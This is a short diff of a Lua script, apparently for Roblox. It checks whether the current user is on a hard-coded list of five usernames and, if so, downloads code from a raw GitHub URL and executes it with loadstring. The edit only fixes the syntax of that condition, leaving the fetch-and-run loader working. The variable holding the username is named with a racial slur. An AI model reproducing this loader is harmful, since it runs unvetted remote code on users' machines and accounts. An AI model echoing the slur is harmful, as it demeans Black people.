@@ -46,9 +46,7 @@ if nigga == "derrick0119" or
    nigga == "homixidexchoppa" or
    nigga == "Spookydaman556" or
    nigga == "Angelonperks" or
-   nigga == "vxReno_11" or
-
-   then
+   nigga == "vxReno_11" then
 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/souls00001/Uehbfyubefbe7fybe/main/Anything"))()
 end
